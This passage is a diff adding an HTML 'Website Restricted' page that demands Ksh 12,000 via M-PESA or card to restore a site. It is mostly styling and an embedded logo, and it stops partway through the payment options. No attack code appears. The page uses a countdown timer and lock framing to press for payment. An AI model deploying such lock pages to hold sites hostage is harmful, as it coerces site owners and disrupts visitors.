@@ -1,0 +1,698 @@
+<!DOCTYPE html>
+<html>
+  <head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <title>Website Restricted</title>
+    <link rel="shortcut icon" href="./img/brave.png" type="image/x-icon">
+    <style media="screen">
+      @keyframes fadeIn {
+        from { opacity: 0; }
+        to { opacity: 1; }
+      }
+      body {
+        background: #ECEFF1;
+        background-image: url(./img/BackgroundUniversal.jpg);
+        background-size: cover;
+        color: rgba(0,0,0,0.87);
+        font-family: 'Roboto', Helvetica, Arial, sans-serif;
+        margin: 0;
+        padding: 0;
+        border-radius: 50px;
+        display: flex;
+        justify-content: center;
+        align-items: center;
+        min-height: 100vh;
+        animation: fadeIn 1s ease-in-out;
+      }
+      #message {
+        background: rgba(241, 242, 246, 0.90);
+        max-width: 960px;
+        margin: 20px;
+        padding: 32px 24px;
+        border-radius: 30px;
+        box-shadow: 0 12px 25px 0 rgba(101, 94, 98, 0.25);
+        text-align: center;
+        animation: fadeIn 1.5s ease-in-out;
+        overflow-y: auto;
+        position: relative;
+      }
+      #message h3 {
+        color: #a86262;
+        font-weight: normal;
+        font-size: 18px;
+        margin: 16px 0 12px;
+      }
+      #message h2 {
+        color: #f6f5f2;
+        padding: 10px;
+        font-weight: bold;
+        background: linear-gradient(45deg,#ff1cac,#2e374b);
+        border-radius: 20px;
+        font-size: 20px;
+        margin: 0 0 8px;
+      }
+      #message h1 {
+        font-size: 24px;
+        font-weight: 300;
+        color: #a86262;
+        margin: 0 0 16px;
+      }
+      #message p {
+        line-height: 1.6;
+        margin: 10px 0 10px;
+        font-size: 16px;
+      }
+      .btn {
+        display: inline-block;
+        text-align: center;
+        background: linear-gradient(90deg,#182c59,#ff1cac);
+        text-transform: uppercase;
+        text-decoration: none;
+        color: white;
+        padding: 16px;
+        border-radius: 20px;
+        font-family: 'Roboto', sans-serif;
+        box-shadow: 0 1px 3px rgba(0,0,0,0.12), 0 1px 2px rgba(0,0,0,0.24);
+        transition: transform 0.2s, background 0.3s;
+        border: none;
+        cursor: pointer;
+        font-size: 16px;
+        margin: 10px 5px;
+      }
+      .btn:hover {
+        background: linear-gradient(90deg,#ff1cac,#182c59);
+      }
+      .btn:active {
+        transform: scale(0.95);
+      }
+      .logo {
+        width: 80px;
+        height: auto;
+        margin: 0 auto;
+        display: block;
+        position: absolute;
+        top: 10px;
+        left: 10px;
+      }
+      .payment-info {
+        background: #fff;
+        padding: 15px;
+        border-radius: 15px;
+        margin: 20px 0;
+        box-shadow: 0 4px 8px rgba(0,0,0,0.1);
+      }
+      .amount {
+        font-size: 28px;
+        font-weight: bold;
+        color: #d32f2f;
+        padding: 15px;
+        border-radius: 10px;
+        background-image: linear-gradient(-45deg, #f0f0f6 0%, #fff 100%);
+        box-shadow: -3px -3px 5px lavender, 3px 3px 5px rgba(209, 209, 209, 0.705);
+        margin: 15px auto;
+        max-width: 200px;
+      }
+      
+      .mpesa-number {
+        font-size: 20px;
+        font-weight: bold;
+        color: #fff;
+        margin: 15px 0;
+        border-radius: 20px;
+        background: linear-gradient(90deg,#ff1cac,#182c59);
+        padding: 12px;
+        display: inline-block;
+      }
+      
+      .payment-methods {
+        display: flex;
+        flex-wrap: wrap;
+        justify-content: center;
+        gap: 15px;
+        margin: 20px 0;
+      }
+      
+      .payment-method {
+        background: #fff;
+        border-radius: 15px;
+        padding: 15px;
+        box-shadow: 0 4px 8px rgba(0,0,0,0.1);
+        width: 150px;
+        display: flex;
+        flex-direction: column;
+        align-items: center;
+        cursor: pointer;
+        transition: transform 0.2s, box-shadow 0.3s;
+      }
+      
+      .payment-method:hover {
+        transform: translateY(-5px);
+        box-shadow: 0 8px 15px rgba(0,0,0,0.15);
+      }
+      
+      .payment-method img {
+        width: 60px;
+        height: 60px;
+        margin-bottom: 10px;
+      }
+      
+      .payment-method span {
+        font-weight: bold;
+      }
+      
+      /* Modal styles */
+      .modal {
+        display: none;
+        position: fixed;
+        z-index: 1000;
+        left: 0;
+        top: 0;
+        width: 100%;
+        height: 100%;
+        background-color: rgba(0,0,0,0.5);
+        animation: fadeIn 0.3s;
+      }
+      
+      .modal-content {
+        background: #fff;
+        margin: 10% auto;
+        padding: 25px;
+        width: 80%;
+        max-width: 500px;
+        border-radius: 20px;
+        box-shadow: 0 5px 15px rgba(0,0,0,0.3);
+        position: relative;
+        animation: slideIn 0.4s;
+      }
+      
+      @keyframes slideIn {
+        from { transform: translateY(-50px); opacity: 0; }
+        to { transform: translateY(0); opacity: 1; }
+      }
+      
+      .close-modal {
+        position: absolute;
+        right: 20px;
+        top: 10px;
+        font-size: 28px;
+        font-weight: bold;
+        color: #aaa;
+        cursor: pointer;
+      }
+      
+      .close-modal:hover {
+        color: #555;
+      }
+      
+      .contact-options {
+        display: flex;
+        flex-wrap: wrap;
+        justify-content: center;
+        gap: 15px;
+        margin-top: 20px;
+      }
+      
+      .contact-option {
+        display: flex;
+        align-items: center;
+        justify-content: center;
+        width: 100%;
+        padding: 15px;
+        border-radius: 10px;
+        background-color: #f8f9fa;
+        transition: background-color 0.3s;
+        text-decoration: none;
+        color: #333;
+      }
+      
+      .contact-option:hover {
+        background-color: #e9ecef;
+      }
+      
+      .contact-option i {
+        margin-right: 10px;
+        font-size: 24px;
+      }
+      
+      .timer {
+        margin: 20px 0;
+        font-size: 18px;
+        color: #d32f2f;
+        font-weight: bold;
+      }
+      
+      .payment-progress {
+        width: 100%;
+        background-color: #f3f3f3;
+        border-radius: 10px;
+        margin: 15px 0;
+        overflow: hidden;
+      }
+      
+      .progress-bar {
+        height: 10px;
+        width: 35%;
+        background: linear-gradient(90deg,#182c59,#ff1cac);
+        border-radius: 10px;
+      }
+      
+      .phone-input {
+        padding: 12px;
+        border-radius: 10px;
+        border: 1px solid #ddd;
+        width: 100%;
+        max-width: 300px;
+        margin: 10px auto;
+        font-size: 16px;
+        text-align: center;
+      }
+      
+      .support-title {
+        font-size: 22px;
+        color: #182c59;
+        margin-bottom: 15px;
+      }
+
+      /* Copy button animation */
+      .copy-btn {
+        padding: 8px 12px;
+        background: #182c59;
+        color: white;
+        border: none;
+        border-radius: 5px;
+        cursor: pointer;
+        margin-left: 10px;
+        transition: background 0.3s;
+      }
+      
+      .copy-btn:hover {
+        background: #ff1cac;
+      }
+      
+      .copy-success {
+        display: none;
+        color: green;
+        font-size: 14px;
+        margin-top: 5px;
+      }
+      
+      .mpesa-container {
+        display: flex;
+        align-items: center;
+        justify-content: center;
+        flex-wrap: wrap;
+        gap: 10px;
+        margin: 15px 0;
+      }
+      
+      .payment-confirmation {
+        margin-top: 20px;
+        padding: 15px;
+        background-color: #e8f5e9;
+        border-radius: 10px;
+        display: none;
+      }
+      
+      .payment-confirmation input {
+        padding: 10px;
+        margin: 10px 0;
+        width: 100%;
+        border-radius: 5px;
+        border: 1px solid #ddd;
+      }
+      
+      .payment-confirmation button {
+        background: linear-gradient(90deg,#182c59,#ff1cac);
+        color: white;
+        border: none;
+        padding: 12px 20px;
+        border-radius: 5px;
+        cursor: pointer;
+        margin-top: 10px;
+      }
+      
+      .tab-container {
+        margin-top: 20px;
+      }
+      
+      .tab-buttons {
+        display: flex;
+        justify-content: center;
+        gap: 5px;
+        margin-bottom: 15px;
+      }
+      
+      .tab-btn {
+        padding: 10px 15px;
+        background: #f1f1f1;
+        border: none;
+        border-radius: 5px 5px 0 0;
+        cursor: pointer;
+      }
+      
+      .tab-btn.active {
+        background: linear-gradient(90deg,#182c59,#ff1cac);
+        color: white;
+      }
+      
+      .tab-content {
+        display: none;
+        padding: 15px;
+        background: #f9f9f9;
+        border-radius: 0 0 10px 10px;
+      }
+      
+      .tab-content.active {
+        display: block;
+      }
+    </style>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.2.0/css/all.min.css">
+  </head>
+  <body>
+    
+    <div id="message">
+      <img src="./images/newlogo.png" alt="" class="logo">
+      <h2>⚠️ WEBSITE ACCESS RESTRICTED</h2>
+      <h3>🤦‍♀️ Pending Payment of Outstanding Balance</h3>
+      
+      <div class="timer">
+        Time remaining: <span id="countdown">23:59:59</span>
+      </div>
+      
+      <div class="payment-progress">
+        <div class="progress-bar"></div>
+      </div>
+      
+      <div class="payment-info">
+        <p>🩺 To restore access to this website, please make a payment of:</p>
+        <div class="amount">Ksh 12,000</div>
+        
+        <div class="payment-methods">
+          <div class="payment-method" onclick="openPaymentModal('mpesa')">
+            <img src="data:image/jpeg;base64,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" alt="M-PESA">
+            <span>M-PESA</span>
+          </div>
+          <div class="payment-method" onclick="openPaymentModal('card')">
+            <img src="https://cdn-icons-png.flaticon.com/512/196/196561.png" alt="Card Payment">
+            <span>Card</span>
